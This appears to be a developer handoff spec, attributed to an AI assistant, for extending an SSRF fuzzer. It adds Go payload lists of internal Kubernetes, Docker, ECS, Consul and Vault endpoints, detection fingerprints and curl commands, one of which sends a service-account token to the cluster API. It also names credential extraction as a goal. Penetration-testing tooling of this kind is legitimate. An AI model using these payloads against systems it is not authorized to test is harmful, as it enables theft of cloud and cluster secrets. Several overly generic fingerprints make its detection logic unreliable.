# Handoff: SSRF Kubernetes & Container Metadata Endpoints

**Date**: 2026-01-21
**Author**: Claude (Opus 4.5)
**Priority**: MEDIUM-HIGH
**Estimated Effort**: Medium (1-2 hours)
**Target Files**:
- `tools/go-ssrf-fuzzer/main.go`
- `tools/go-ssrf-fuzzer/fuzzer/fuzzer.go`

---

## 1. Problem Statement

Modern applications often run in containerized environments (Docker, Kubernetes, ECS, etc.). These environments expose additional metadata endpoints that can be exploited via SSRF:

1. **Kubernetes API Server** - Full cluster access if service account token is available
2. **Docker Socket** - Container escape / host takeover
3. **ECS Task Metadata** - AWS credentials for containerized tasks
4. **Consul/Vault** - Service discovery and secrets

### Current State

The current SSRF fuzzer focuses mainly on cloud provider metadata (AWS, GCP, Azure) but lacks:
- Kubernetes API endpoints
- Docker API endpoints
- ECS container metadata
- Service mesh endpoints (Consul, Vault)

---

## 2. Implementation Details

### 2.1 Add Kubernetes Endpoints

In `fuzzer/fuzzer.go`:

```go
// KubernetesPayloads returns Kubernetes-specific SSRF targets
func KubernetesPayloads() []PayloadWithHeaders {
    endpoints := []string{
        // ================================================================
        // KUBERNETES API SERVER (Default: 443, sometimes 6443 or 8443)
        // ================================================================
        // These work if the pod has a service account token mounted
        "https://kubernetes.default.svc/",
        "https://kubernetes.default.svc/api",
        "https://kubernetes.default.svc/api/v1",
        "https://kubernetes.default.svc/api/v1/namespaces",
        "https://kubernetes.default.svc/api/v1/pods",
        "https://kubernetes.default.svc/api/v1/secrets",
        "https://kubernetes.default.svc/api/v1/configmaps",
        "https://kubernetes.default.svc/apis",
        "https://kubernetes.default.svc/version",
        "https://kubernetes.default.svc/healthz",

        // Alternative service names
        "https://kubernetes/",
        "https://kubernetes:443/",
        "https://kubernetes:6443/",
        "https://kubernetes:8443/",

        // IP-based access (cluster IP is usually 10.0.0.1 or 10.96.0.1)
        "https://10.0.0.1:443/",
        "https://10.96.0.1:443/",
        "https://10.0.0.1:6443/",

        // ================================================================
        // KUBELET API (Port 10250 - Node-level access)
        // ================================================================
        "https://127.0.0.1:10250/pods",
        "https://127.0.0.1:10250/runningpods",
        "https://127.0.0.1:10250/metrics",
        "https://127.0.0.1:10250/stats/summary",
        "https://localhost:10250/pods",

        // Read-only Kubelet (Port 10255)
        "http://127.0.0.1:10255/pods",
        "http://127.0.0.1:10255/metrics",

        // ================================================================
        // ETCD (Port 2379 - Cluster state database)
        // ================================================================
        "http://127.0.0.1:2379/version",
        "http://127.0.0.1:2379/v2/keys/",
        "http://127.0.0.1:2379/v2/keys/?recursive=true",
        "https://127.0.0.1:2379/version",
    }

    var payloads []PayloadWithHeaders
    for _, endpoint := range endpoints {
        payloads = append(payloads, PayloadWithHeaders{
            URL:     endpoint,
            Headers: map[string]string{}, // No special headers needed
        })
    }

    return payloads
}
```

### 2.2 Add Docker API Endpoints

```go
// DockerPayloads returns Docker daemon SSRF targets
func DockerPayloads() []string {
    return []string{
        // ================================================================
        // DOCKER SOCKET (via HTTP proxy or misconfigured exposure)
        // ================================================================
        // Unix socket exposed via TCP (common misconfiguration)
        "http://127.0.0.1:2375/version",
        "http://127.0.0.1:2375/info",
        "http://127.0.0.1:2375/containers/json",
        "http://127.0.0.1:2375/images/json",
        "http://127.0.0.1:2375/networks",
        "http://127.0.0.1:2375/volumes",

        // With TLS (port 2376)
        "https://127.0.0.1:2376/version",
        "https://127.0.0.1:2376/info",
        "https://127.0.0.1:2376/containers/json",

        // Docker Desktop (Windows/Mac)
        "http://host.docker.internal:2375/version",

        // ================================================================
        // DOCKER SWARM
        // ================================================================
        "http://127.0.0.1:2377/", // Swarm management port
    }
}
```

### 2.3 Add ECS Container Metadata

```go
// ECSPayloads returns AWS ECS container metadata endpoints
func ECSPayloads() []string {
    return []string{
        // ================================================================
        // ECS CONTAINER METADATA (v2 - Deprecated but still common)
        // ================================================================
        "http://169.254.170.2/v2/metadata",
        "http://169.254.170.2/v2/credentials",

        // ================================================================
        // ECS CONTAINER METADATA (v3/v4 - Current)
        // Uses ECS_CONTAINER_METADATA_URI environment variable
        // ================================================================
        // These are relative paths, the full URL is in env var
        // But we can try common patterns
        "http://169.254.170.2/v3/",
        "http://169.254.170.2/v3/task",
        "http://169.254.170.2/v3/task/stats",
        "http://169.254.170.2/v4/",
        "http://169.254.170.2/v4/task",
        "http://169.254.170.2/v4/task/stats",

        // ================================================================
        // ECS TASK ROLE CREDENTIALS
        // ================================================================
        // Path from AWS_CONTAINER_CREDENTIALS_RELATIVE_URI env var
        "http://169.254.170.2/v2/credentials/",
    }
}
```

### 2.4 Add Service Mesh / Service Discovery

```go
// ServiceMeshPayloads returns common service mesh endpoints
func ServiceMeshPayloads() []string {
    return []string{
        // ================================================================
        // CONSUL (Service Discovery)
        // ================================================================
        "http://127.0.0.1:8500/v1/agent/self",
        "http://127.0.0.1:8500/v1/catalog/services",
        "http://127.0.0.1:8500/v1/catalog/nodes",
        "http://127.0.0.1:8500/v1/kv/?recurse",
        "http://consul.service.consul:8500/v1/agent/self",

        // ================================================================
        // VAULT (Secrets Management)
        // ================================================================
        "http://127.0.0.1:8200/v1/sys/health",
        "http://127.0.0.1:8200/v1/sys/seal-status",
        "http://127.0.0.1:8200/v1/sys/mounts",
        "http://vault.service.consul:8200/v1/sys/health",

        // ================================================================
        // PROMETHEUS (Monitoring)
        // ================================================================
        "http://127.0.0.1:9090/api/v1/targets",
        "http://127.0.0.1:9090/api/v1/status/config",
        "http://127.0.0.1:9090/metrics",

        // ================================================================
        // GRAFANA (Dashboards)
        // ================================================================
        "http://127.0.0.1:3000/api/org",
        "http://127.0.0.1:3000/api/datasources",

        // ================================================================
        // REDIS (Common in containers)
        // ================================================================
        // Via HTTP proxy or exposed API
        "http://127.0.0.1:6379/info", // Won't work via HTTP, but good to check

        // ================================================================
        // ELASTICSEARCH
        // ================================================================
        "http://127.0.0.1:9200/",
        "http://127.0.0.1:9200/_cluster/health",
        "http://127.0.0.1:9200/_cat/indices",
        "http://elasticsearch:9200/",
    }
}
```

### 2.5 Add Detection Fingerprints

```go
func (f *Fuzzer) IsKubernetesAPI(body string) bool {
    fingerprints := []string{
        "kubernetes",
        "apiVersion",
        "kind",
        "metadata",
        "namespace",
        "serviceAccount",
        "kubelet",
        "kube-system",
        "ClusterIP",
        "containerPort",
    }

    for _, fp := range fingerprints {
        if strings.Contains(body, fp) {
            return true
        }
    }
    return false
}

func (f *Fuzzer) IsDockerAPI(body string) bool {
    fingerprints := []string{
        "Docker",
        "ContainerConfig",
        "HostConfig",
        "NetworkSettings",
        "ApiVersion",
        "BuildVersion",
        "container",
        "Image",
        "Volumes",
    }

    for _, fp := range fingerprints {
        if strings.Contains(body, fp) {
            return true
        }
    }
    return false
}

func (f *Fuzzer) IsECSMetadata(body string) bool {
    fingerprints := []string{
        "TaskARN",
        "ContainerARN",
        "ClusterARN",
        "DesiredStatus",
        "KnownStatus",
        "TaskDefinition",
        "ecs.amazonaws.com",
    }

    for _, fp := range fingerprints {
        if strings.Contains(body, fp) {
            return true
        }
    }
    return false
}

func (f *Fuzzer) IsConsul(body string) bool {
    fingerprints := []string{
        "consul",
        "Datacenter",
        "NodeName",
        "ServiceName",
        "ServicePort",
        "TaggedAddresses",
    }

    for _, fp := range fingerprints {
        if strings.Contains(body, fp) {
            return true
        }
    }
    return false
}

func (f *Fuzzer) IsVault(body string) bool {
    fingerprints := []string{
        "vault",
        "sealed",
        "cluster_name",
        "initialized",
        "standby",
        "performance_standby",
    }

    for _, fp := range fingerprints {
        if strings.Contains(body, fp) {
            return true
        }
    }
    return false
}
```

### 2.6 Update `main.go`

```go
// Add flags
kubeEndpoints := flag.Bool("kube", true, "Include Kubernetes API endpoints")
dockerEndpoints := flag.Bool("docker", true, "Include Docker API endpoints")
ecsEndpoints := flag.Bool("ecs", true, "Include AWS ECS metadata endpoints")
serviceEndpoints := flag.Bool("services", true, "Include service mesh endpoints (Consul, Vault, etc.)")
```

---

## 3. Severity Classification

| Target | Severity | Reason |
|--------|----------|--------|
| Kubernetes secrets | CRITICAL | Direct secret access |
| Docker containers/json | CRITICAL | Container escape possible |
| ECS credentials | CRITICAL | AWS credentials exposed |
| Vault secrets | CRITICAL | Secrets management bypass |
| Kubernetes pods | HIGH | Workload enumeration |
| Docker info | HIGH | Host information exposed |
| Consul KV | HIGH | Config/secrets in KV store |
| Kubelet pods | MEDIUM | Pod information exposure |
| Prometheus targets | MEDIUM | Infrastructure mapping |
| Elasticsearch | MEDIUM | Data exposure risk |

---

## 4. Kubernetes Service Account Token

When testing Kubernetes API, if the pod has a service account token, it's mounted at:
```
/var/run/secrets/kubernetes.io/serviceaccount/token
```

This token can be used in the `Authorization: Bearer <token>` header. Consider adding logic to:
1. Try to read the token via LFI (separate vulnerability)
2. Use it in Kubernetes API requests if found

---

## 5. Testing

### Test Kubernetes Access

```bash
# From inside a Kubernetes pod
curl -k https://kubernetes.default.svc/api/v1/namespaces \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
```

### Test Docker Access

```bash
# If Docker TCP is exposed
curl http://127.0.0.1:2375/version
```

### Test ECS Metadata

```bash
# From inside an ECS container
curl http://169.254.170.2/v2/metadata
```

---

## 6. Verification Checklist

- [ ] `KubernetesPayloads()` returns 20+ endpoints
- [ ] `DockerPayloads()` returns 10+ endpoints
- [ ] `ECSPayloads()` returns 10+ endpoints
- [ ] `ServiceMeshPayloads()` returns 15+ endpoints
- [ ] Detection fingerprints for each service type
- [ ] Severity classification implemented
- [ ] Build succeeds: `go build -o go-ssrf-fuzzer .`

---

## 7. Security Considerations

Some of these endpoints can cause side effects:
- Docker API allows container creation/deletion
- Kubernetes API with write access can deploy pods
- Consul can modify service registration

For safety, the fuzzer should:
1. Only use GET/HEAD methods
2. Never send POST/PUT/DELETE to container orchestration APIs
3. Log any endpoints that appear writable

---

## 8. Success Criteria

1. Fuzzer detects Kubernetes API exposure via SSRF
2. Docker daemon exposure is identified
3. ECS task credentials are extracted
4. Service mesh endpoints (Consul, Vault) are detected
5. Proper severity classification based on endpoint sensitivity

